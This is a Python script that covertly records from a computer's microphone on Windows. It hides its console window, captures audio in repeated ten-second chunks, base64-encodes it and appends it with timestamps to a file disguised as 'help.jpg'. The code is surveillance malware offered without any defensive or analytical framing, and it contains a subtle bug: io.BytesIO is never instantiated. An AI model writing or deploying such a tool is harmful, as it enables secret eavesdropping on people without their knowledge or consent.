import pyaudio, wave,time,base64,os,sys,io
from datetime import datetime

platform = sys.platform
if platform =='win32':
    import win32gui, win32console

type = pyaudio.paInt16
chnls=1
rate = 10000
chunk=1024
audDur = 10
slpDur = 10
flePath="help.jpg"

audio = pyaudio.PyAudio()

def hideWindow():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)

def writeData(data):
    with open(flePath ,'a') as fle:
        fle.write(data)
    fle.close()

if __name__ == "__main__":
    try :
        if platform=="win32":
            hideWindow()
            while True:
                stream = audio.open(format=type,channels=chnls,rate=rate,input=True, frames_per_buffer=chunk)
                frames=[]
                for i in range(0,int(rate/chunk * audDur)):
                    data=stream.read(chunk)
                    frames.append(data)
                stream.stop_stream()
                stream.close()
                buf = io.BytesIO
                waveFile = wave.open(buf,"wb")
                waveFile.setnchannels(chnls)
                waveFile.setsamplewidth(audio.get_sample_size(type))
                waveFile.setframerate(rate)
                waveFile.writeframes(b"".join(frames))
                waveFile.close()

                aud64=str(base64.b64encode(buf.getvalue()).decode())
                writeData("::a::" + str(datetime.now())+'\n'+str(aud64)+'\n')
                time.sleep(slpDur)
    except:
        audio.terminate()